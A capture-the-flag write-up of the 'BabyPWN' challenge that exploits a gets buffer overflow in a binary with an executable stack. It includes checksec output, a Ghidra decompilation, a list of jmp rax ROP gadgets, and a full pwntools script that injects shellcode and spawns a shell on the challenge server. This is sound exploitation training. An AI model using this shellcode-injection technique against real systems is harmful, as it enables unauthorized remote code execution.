---
description: Binary Exploitation
---

# BabyPWN

> I hope you are having a nice day.

{% file src="../../.gitbook/assets/main" %}

```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x400000)
Stack:      Executable
RWX:        Has RWX segments
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

An extremely short buffer overflow challenge, with an executable stack! Meaning I can use shellcode and the question was just HOW?

```c
void vuln(void)

{
  undefined local_78 [112];
  
  FUN_00401040(local_78);
  return;
}
```

This was the entire program being decompiled using Ghidra. An array of 112 size and a gets function call. Just those two things. Now something new I just learned is that the way gets works is that:

* it accepts input into the buffer
* it returns the pointer to the buffer
* saves the buffer in RAX

Coincidentally, there was a ROP gadget that does exactly jmp rax :

```
0x00000000004010a5 : je 0x4010b0 ; mov edi, 0x404030 ; jmp rax
0x00000000004010e7 : je 0x4010f0 ; mov edi, 0x404030 ; jmp rax
0x00000000004010ac : jmp rax
0x00000000004010a7 : mov edi, 0x404030 ; jmp rax
0x00000000004010a6 : or dword ptr [rdi + 0x404030], edi ; jmp rax
0x00000000004010a3 : test eax, eax ; je 0x4010b0 ; mov edi, 0x404030 ; jmp rax
0x00000000004010e5 : test eax, eax ; je 0x4010f0 ; mov edi, 0x404030 ; jmp rax
```

Using a shellcode stored in the beginning of the buffer, and a gadget pointing there. I built a ROP chain using pwntools:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# -*- template: winterbitia -*-

# ====================
# -- PWNTOOLS SETUP --
# ====================

from pwn import *

exe = context.binary = ELF(args.EXE or 'main')
trm = context.terminal = ['tmux', 'splitw', '-h']

host = args.HOST or 'chals.bitskrieg.in'
port = int(args.PORT or 6001)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *vuln+29
continue
'''.format(**locals())

# =======================
# -- EXPLOIT GOES HERE --
# =======================

io = start()

OFFSET = 120
JMP_RAX = 0x00000000004010ac

payload = flat(
    asm(shellcraft.sh()),
    cyclic(OFFSET - len(asm(shellcraft.sh())), n=8),
    JMP_RAX
)

io.sendline(payload)

io.interactive()
```

<figure><img src="../../.gitbook/assets/Screenshot 2025-02-07 201720 (1).png" alt=""><figcaption></figcaption></figure>
